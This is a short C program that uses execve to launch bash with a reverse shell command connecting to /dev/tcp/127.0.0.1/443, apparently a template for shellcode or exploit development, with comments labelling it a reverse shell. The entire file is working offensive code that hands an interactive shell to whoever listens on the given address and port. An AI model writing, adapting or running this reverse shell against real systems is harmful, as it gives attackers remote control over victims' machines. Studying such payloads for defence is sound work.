#include <stdio.h>
#include <unistd.h>

int main(void) {
    char* args[] = { 
        "/bin/bash", "-c", // run a new command (could be /bin/sh to save few bytes)
        "//*/bash -i >& /dev/tcp/127.0.0.1/443 0>&1", // reverse shell command
        NULL // NULL byte telling we reached the last argument
    };

    execve(args[0], &args[0], NULL);

    return 0;
}
